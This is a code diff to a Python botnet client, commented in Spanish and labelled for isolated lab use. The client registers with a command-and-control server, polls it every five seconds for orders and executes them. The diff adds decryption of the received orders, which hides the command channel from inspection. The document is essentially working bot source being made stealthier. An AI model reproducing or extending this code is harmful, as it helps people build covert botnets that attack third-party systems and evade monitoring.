@@ -7,6 +7,7 @@ Uso solo en un laboratorio aislado y controlado.
 import socket
 import time
 import requests
+from crypto import descifrar
 
 CC = "http://localhost:8000"
 BOT_ID = "bot1"
@@ -29,14 +30,12 @@ def ejecutar(orden):
         ruta=p.get("parametros_http", {}).get("ruta", "/") if isinstance(p.get("ruta"), dict) else p.get("ruta", "/"),
     )
 
-
 if __name__ == "__main__":
-    # registro al arrancar
     requests.post(f"{CC}/registro", json={"id": BOT_ID})
-    # polling: pregunta su orden cada 5s
     while True:
         r = requests.get(f"{CC}/ordenes/{BOT_ID}")
-        orden = r.json().get("orden")
-        if orden:
-            ejecutar(orden)
+        if r.content:
+            orden = descifrar(r.content)
+            if orden:
+                ejecutar(orden)
         time.sleep(5)
